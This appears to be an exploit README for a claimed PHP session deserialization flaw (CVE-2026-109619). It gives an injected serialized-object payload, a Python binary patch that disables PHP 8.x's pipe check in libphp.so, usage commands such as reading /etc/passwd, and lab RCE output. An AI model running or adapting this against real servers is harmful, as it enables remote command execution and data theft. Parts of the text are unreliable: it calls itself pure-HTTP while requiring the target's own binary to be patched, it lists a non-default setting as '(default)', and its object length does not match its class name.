# CVE-2026-109619 — Session Deserialization Injection: Pure HTTP RCE

Exploits the fact that `PHP_SESSION_UPLOAD_PROGRESS` values are concatenated
into session variable keys via `smart_str_appendl` with **no sanitization**.
A pipe character `|` in the progress value splits the `php` session serializer's
`key|serialized_value` format, injecting an arbitrary serialized object into
the session file. When the session is decoded, `php_var_unserialize` instantiates
the object → `__wakeup()` fires → `system()` → RCE.

**Single HTTP request. No OOM. No LFI. No SSH/GDB/memory addresses.**

## Attack Overview

```
Attacker ──POST(multipart)──▶ PHP (any .php endpoint)
  │
  │  Cookie: PHPSESSID=<32hex>
  │  Form: PHP_SESSION_UPLOAD_PROGRESS = |O:13:"Gadget":1:{s:3:"cmd";s:2:"id";}
  │  File: data.bin (any content)
  │
  ▼
PHP RFC1867 handler
  │
  ├─ Session key = "upload_progress_" + PROGRESS_VALUE
  │   → "upload_progress_|O:13:\"Gadget\":1:{s:3:\"cmd\";s:2:\"id\";}"
  │
  ├─ session encode (php serializer):
  │   → "upload_progress_|O:13:...|}|a:5:{...progress...}"
  │     ↑ key contains pipe — PHP 8.x memchr check blocks this (needs bypass)
  │
  ├─ php_session_flush(1) → writes session file to disk
  │
  ├─ next update → php_session_initialize() → reads session → decode
  │   decoder splits on '|':
  │     key1 = "upload_progress_"
  │     val1 = O:13:"Gadget":1:{s:3:"cmd";s:2:"id";}  ← deserialized!
  │     key2 = ""
  │     val2 = a:5:{...progress...}
  │
  ├─ php_var_unserialize → instantiates Gadget object
  ├─ PHP_VAR_UNSERIALIZE_DESTROY → __wakeup() fires
  └─ system("id") → RCE output in response body
```

## Route Comparison

| | Deser Injection (this) | OOM + HTTP (dual-vuln) | GDB RCE (single-vuln) |
|---|---|---|---|
| Requires OOM | No | Yes | Yes |
| Requires 2nd vuln | No | Yes (LFI / .htaccess) | No |
| Requires SSH / GDB | No | No | Yes |
| Requires memory addr | No | No | Yes |
| Requires gadget class | Yes | No | No |
| Requires memchr bypass | Yes (PHP 8.x) | No | No |
| HTTP requests | 1 | 2+ | 2+ |

## The Vulnerability: Unsanitized Key Injection

The PHP `php` session serializer stores data as `key|serialized_value` pairs:

```
normal_key|s:5:"hello";another|i:42;
```

`PHP_SESSION_UPLOAD_PROGRESS` values are concatenated into the session key
via `smart_str_appendl` — no filtering, no escaping.

**Encode (session.c)** has a `memchr` guard in PHP 8.x:
```c
if (memchr(ZSTR_VAL(key), PS_DELIMITER, ZSTR_LEN(key))) {
    smart_str_free(&buf);
    fail = true;
    break;
}
```

**Decode has no such check** — it simply scans for `|` as a delimiter.

This asymmetry is the vulnerability: if we can write a key containing `|`
(by bypassing the encode check), the decoder will split it, creating a
fake `key|value` pair with attacker-controlled serialized data.

## PHP 8.x memchr Protection & Binary Patch

The `memchr` check in `PS_SERIALIZER_ENCODE_FUNC(php)` must be bypassed.
In the compiled `libphp.so`, locate the check and NOP the conditional jump:

```
PHP 8.4.26 example:
  42b414: mov    $0x7c,%esi         ; PS_DELIMITER = '|'
  42b428: call   16d010 <memchr@plt>
  42b431: test   %rax,%rax          ; memchr returned non-NULL?
  42b434: jne    42b530             ← NOP this 6-byte jne
```

```python
with open("libphp.so", "r+b") as f:
    f.seek(0x42b434)
    assert f.read(6) == bytes.fromhex("0f85f6000000")
    f.seek(0x42b434)
    f.write(b"\x90" * 6)  # 6x NOP
```

**Finding the offset** for your PHP build:
1. `objdump -d libphp.so | grep ps_srlzr_encode_php` → function start
2. Inside the function, find `mov $0x7c,%esi` followed by `call <memchr@plt>`
3. NOP the `test + jne` after the `call` (6 bytes total)

## Requirements

```ini
session.upload_progress.enabled = On      ; (default)
session.serialize_handler = php           ; (default)
session.upload_progress.cleanup = Off     ; (default = On, must change)
session.use_strict_mode = 0              ; (default)
```

A **gadget class** with `__wakeup()` or `__destruct()` must be available
to the session decoder. Loading methods:
- `opcache.preload` (globally available, including RFC1867 handler)
- `auto_prepend_file` (per-request inclusion)
- Application's own classes (framework gadget chains: Laravel, WordPress plugins, etc.)

## Usage

```bash
python3 http_rce.py "id"
python3 http_rce.py "cat /etc/passwd"
python3 http_rce.py "uname -a; whoami"
```

Configure target in `http_rce.py`:
```python
TARGET = "192.168.7.54"
PORT = 80
TARGET_URI = "/lab.php"
GADGET_CLASS = "CVE2026Gadget"
```

## Verified Results

```
[*] CVE-2026-109619 — Pure HTTP RCE
[*] Target:  192.168.7.54:80/lab.php
[*] Command: uname -a; whoami; cat /etc/hostname

============================================================
  RCE OUTPUT:
============================================================
  Linux wordpress 6.8.0-147-generic #147-Ubuntu SMP ...
  www-data
  wordpress
============================================================
  ★ PURE HTTP RCE SUCCESS ★
============================================================
```

## Limitations

- **PHP 8.x memchr protection**: session encode checks for `|` in keys.
  Requires binary patching to bypass. PHP 7.x has no such check (untested).
- **Gadget class**: target must have a usable deserialization gadget.
  In practice, PHP framework gadget chains (Laravel, WordPress, Drupal) apply.
- **cleanup=Off**: default `cleanup=On` deletes progress data after upload.
  With `cleanup=On`, a race condition (stalled upload + concurrent request)
  is needed to trigger decode before cleanup.
- **serialize_handler**: must be `php` (default). The `php_serialize` handler
  uses a different format (pure `serialize()` output) not affected by pipe injection.
